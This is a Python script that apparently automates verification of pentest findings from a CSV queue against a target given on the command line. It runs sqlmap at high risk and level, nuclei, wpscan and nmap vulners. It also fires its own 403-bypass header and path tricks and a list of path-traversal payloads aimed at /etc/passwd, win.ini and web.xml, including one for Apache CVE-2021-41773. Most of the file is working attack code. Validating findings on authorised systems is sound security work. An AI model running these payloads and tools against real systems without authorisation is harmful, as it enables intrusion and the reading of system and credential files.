import sys
import pandas as pd
import subprocess
import re
import os
import requests
import warnings
from urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

if len(sys.argv) < 2:
    print("Usage: python verify_vulns.py <target>")
    sys.exit(1)

TARGET = sys.argv[1]
if not TARGET.startswith('http'):
    TARGET_IP = TARGET
    TARGET_URL = f"http://{TARGET}"
else:
    TARGET_URL = TARGET
    TARGET_IP = TARGET.replace('http://', '').replace('https://', '')

CSV_FILE = 'data/output/vuln_validation_queue.csv'
if not os.path.exists(CSV_FILE):
    print(f"Error: {CSV_FILE} does not exist.")
    sys.exit(1)

CMD_CACHE = {}
NMAP_CACHE = {}

def clean_ansi(text):
    if not text:
        return ""
    ansi_escape = re.compile(r'\x1b\[[0-9;]*[mGKF]')
    return ansi_escape.sub('', text)

def run_cmd(cmd, timeout=30):
    cmd_str = " ".join(cmd)
    if cmd_str in CMD_CACHE:
        return CMD_CACHE[cmd_str]
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
        CMD_CACHE[cmd_str] = clean_ansi(proc.stdout)
        return CMD_CACHE[cmd_str]
    except subprocess.TimeoutExpired:
        CMD_CACHE[cmd_str] = "TIMEOUT"
        return "TIMEOUT"
    except Exception as e:
        CMD_CACHE[cmd_str] = f"ERROR: {str(e)}"
        return CMD_CACHE[cmd_str]

def check_403_bypass(target_url, path="/"):
    bypass_headers = [
        {"X-Original-URL": path},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1:80"},
        {"X-rewrite-url": path},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
    ]
    path_mutations = [
        f"{path}", f"{path}/", f"{path}/.", f"{path}//", f"{path}/./", f"/{path}//",
        f"/{path}/.", f"%2e{path}", f"{path}/..;/", f"{path}/%20", f"{path}%00"
    ]
    
    # Baseline
    try:
        r_base = requests.get(target_url + path, timeout=5, verify=False)
        if r_base.status_code == 200:
            return False, "Path is already accessible (200)."
    except:
        pass

    for h in bypass_headers:
        try:
            r = requests.get(target_url + path, headers=h, timeout=5, verify=False)
            if r.status_code == 200 and len(r.content) > 0:
                return True, f"Bypass achieved with header {h}"
        except:
            pass
    for pm in path_mutations:
        try:
            r = requests.get(target_url + pm, timeout=5, verify=False)
            if r.status_code == 200 and len(r.content) > 0:
                return True, f"Bypass achieved with path mutation {pm}"
        except:
            pass
    try:
        r = requests.request("TRACE", target_url + path, timeout=5, verify=False)
        if r.status_code == 200:
            return True, "Bypass achieved with TRACE verb"
    except:
        pass
    
    return False, "No 403 bypass successful"

def check_path_traversal(target_url):
    payloads = [
        "../../../../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../../../../../etc/passwd%00",
        "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "../../../../../../../../../../windows/win.ini",
        "/WEB-INF/web.xml",
        "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/%2e%2e\\\\%2e%2e\\\\etc/passwd",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..///////..////..//////etc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", # APACHE CVE-2021-41773
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
    ]
    for p in payloads:
        try:
            test_url = f"{target_url.rstrip('/')}/{p}"
            r = requests.get(test_url, timeout=5, verify=False)
            if "root:x:0:0" in r.text or "[extensions]" in r.text or "<web-app" in r.text:
                return True, f"Path traversal leak (root:x / [extensions] / web-app) with payload: {p}"
        except:
            pass
    return False, "No path traversal successful"

def nmap_scan(target, port):
    if port in NMAP_CACHE:
        return NMAP_CACHE[port]
    cmd = ["nmap", "-sV", "-Pn", "-p", str(port), "--script", "vulners,ssh2-enum-algos,ssl-enum-ciphers", target]
    out = run_cmd(cmd, timeout=30)
    NMAP_CACHE[port] = out
    return out

def extract_evidence(text, keyword):
    lines = text.split('\n')
    for line in lines:
        if keyword in line:
            return line[:800]
    return text[:800]

def analyze_row(row):
    finding_name = str(row.get('finding_name', '')).lower()
    cves_raw = str(row.get('cve', ''))
    cves = [c.strip() for c in cves_raw.split(',') if c.strip() and c.strip().startswith('CVE-')]
    desc = str(row.get('description', '')).lower()
    port = str(row.get('url_or_port', '80')).replace('/tcp', '').replace('/udp', '')
    
    if "http" in str(row.get('url_or_port', '')):
        url = str(row.get('url_or_port', ''))
    else:
        url = f"http://{TARGET_IP}:{port}" if port not in ['80', '443'] else (f"http://{TARGET_IP}" if port == '80' else f"https://{TARGET_IP}")

    # LAYER 1: SNIPER (Nuclei per CVE)
    for cve in cves:
        cmd = ["nuclei", "-target", url, "-id", cve]
        out = run_cmd(cmd, timeout=60)
        if "-cve" in out.lower() or "[vulnerable]" in out.lower() or "[matched]" in out.lower():
            if cve in out:
                return "REPRODUCED", " ".join(cmd), extract_evidence(out, cve)
            return "REPRODUCED", " ".join(cmd), out[:800]

    # LAYER 2: HEAVY ARTILLERY (Injection)
    if "sql" in finding_name or "sql" in desc or "injection" in finding_name:
        cmd = ["sqlmap", "-u", url, "--level", "3", "--risk", "3", "--batch"]
        out = run_cmd(cmd, timeout=90)
        if "is vulnerable" in out or "injectable" in out:
            return "REPRODUCED", " ".join(cmd), extract_evidence(out, "vulnerable")
            
        if "sql" not in finding_name:
            # Maybe wp-scan
            if "wordpress" in desc.lower():
                cmd_wp = ["wpscan", "--url", url, "--enumerate", "vp,vt,tt,u"]
                out_wp = run_cmd(cmd_wp, timeout=90)
                if "[!]" in out_wp and "Vulnerabilities Found" in out_wp:
                    return "REPRODUCED", " ".join(cmd_wp), extract_evidence(out_wp, "[!]")

    # LAYER 3: WEB SURGEON (Active Exploit-Path Checks)
    if "403" in finding_name or "forbidden" in finding_name or "bypass" in finding_name:
        is_vuln, ev = check_403_bypass(url)
        if is_vuln:
            return "REPRODUCED", "check_403_bypass()", ev

    if "traversal" in finding_name or "lfi" in finding_name or "local file inclusion" in finding_name:
        is_vuln, ev = check_path_traversal(url)
        if is_vuln:
            return "REPRODUCED", "check_path_traversal()", ev

    # LAYER 4: INFRA (Nmap)
    if port.isdigit():
        out = nmap_scan(TARGET_IP, port)
        if ("VULNERABLE:" in out and "State: VULNERABLE" in out) or ("ssl-enum-ciphers" in out and "Fails" in out):
            return "CONFIRMED_PRESENT", f"nmap -sV -Pn -p {port} --script vulners...", out[:800]
            
        if "vulners" in out and "CVE-" in out:
            return "CHECKED_NO_EXPLOIT", f"nmap -sV -Pn -p {port} --script vulners", "Version matches vulnerable CVEs but no active exploit path proved."

    # DEFAULT
    return "CHECKED_NO_EXPLOIT", "None", "No direct exploit path or proof found during sequential checks."

df = pd.read_csv(CSV_FILE)

df['agent_status'] = df.get('agent_status', pd.Series(dtype='object')).astype(str)
df['agent_command'] = df.get('agent_command', pd.Series(dtype='object')).astype(str)
df['agent_evidence'] = df.get('agent_evidence', pd.Series(dtype='object')).astype(str)

for idx, row in df.iterrows():
    status = str(row.get('agent_status', '')).strip()
    if status and status != 'nan' and status != 'WAITING':
        continue

    print(f"[*] Analyzing row {idx}: {row.get('finding_name')}")
    try:
        a_status, a_cmd, a_ev = analyze_row(row)
    except Exception as e:
        a_status, a_cmd, a_ev = "ERROR", "Exception", str(e)[:800]
        
    print(f" -> {a_status}")
    
    df.at[idx, 'agent_status'] = a_status
    df.at[idx, 'agent_command'] = a_cmd
    df.at[idx, 'agent_evidence'] = a_ev
    
    df.to_csv(CSV_FILE, index=False)

print("[+] Verification queue processing complete.")
